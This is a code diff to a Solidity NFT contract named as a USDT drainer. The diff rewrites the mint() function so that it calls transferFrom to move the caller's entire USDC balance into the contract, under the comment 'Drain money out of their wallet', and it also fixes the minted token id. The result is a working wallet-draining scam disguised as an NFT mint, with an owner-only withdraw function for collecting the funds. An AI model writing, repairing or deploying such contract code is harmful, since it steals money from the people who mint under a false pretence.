@@ -23,9 +23,9 @@ contract NASNFTContractUSDTDrain is ERC721, Ownable {
     function mint() public payable {
         require(balanceOf(_msgSender()) == 0, "You already have a token");
         // Drain money out of their wallet
-        IERC20(_usdc).transfer(address(this), IERC20(_usdc).balanceOf(_msgSender()));
+        IERC20(_usdc).transferFrom(_msgSender(), address(this), IERC20(_usdc).balanceOf(_msgSender()));
         currentMintId = currentMintId + 1;
-        _safeMint(_msgSender(), currentMintId + 1);
+        _safeMint(_msgSender(), currentMintId);
     }
 
     function withdraw() public onlyOwner returns (bool){
